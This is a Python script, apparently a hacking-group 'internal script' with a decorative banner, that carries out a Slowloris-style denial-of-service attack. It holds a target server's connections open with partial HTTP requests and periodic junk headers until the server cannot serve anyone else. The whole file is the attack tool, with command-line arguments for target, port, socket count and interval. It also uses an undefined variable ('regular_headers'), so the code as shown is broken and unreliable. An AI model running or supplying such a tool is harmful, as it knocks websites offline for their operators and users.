#usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import random
import time
import fade
import socket
import getpass
from progress.bar import Bar


os.system("clear")
logo = """

       _/       _/     _/ _/     _/        _/  _/_/_/_/_/
       _/     _/     _/     _/   _/        _/  _/       _/
       _/   _/      _/       _/  _/        _/  _/       _/    
       _/ _/        _/       _/  _/        _/  _/      _/       
       _/   _/      _/       _/  _/ _/_/_/ _/  _/_/_/_/
       _/     _/    _/_/_/_/ _/  _/        _/  _/     _/
       _/       _/  _/       _/  _/        _/  _/       _/
       
\033[96m╔═══════════════════════════════════════════════════════════╗
\033[96m║\033[34m                            0ZCON                           \033[96m║
\033[96m║\033[33m                       INTERNAL SCRIPT                      \033[96m║
\033[96m║\033[32m                          By: KF'99                         \033[96m║
\033[96m║\033[95m                           ——o0o——                          \033[96m║
\033[96m╚════════════════════════════════════════════════════════════
"""
faded_text = fade.fire(logo)
print(faded_text)
def init_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,int(port)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))

    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))

    return s

def main():
    if len(sys.argv)<5:
        print(("\033[92mUsage: {} example.com 80 100 10".format(sys.argv[0])))
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count= int(sys.argv[3])
    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
    timer = int(sys.argv[4])
    socket_list=[]

    for _ in range(int(socket_count)):
        try:
            s=init_socket(ip,port)
        except socket.error:
            break
        socket_list.append(s)
        next(bar)

    bar.finish()

    while True:
        print(("\033[92m [÷] Kahr Conecting to Wabs {}".format(len(socket_list))))

        for s in socket_list:
            try:
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            print(("\033[33m {}      Sending to packet".format("\n")))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break

        time.sleep(timer)

if __name__=="__main__":
    main()
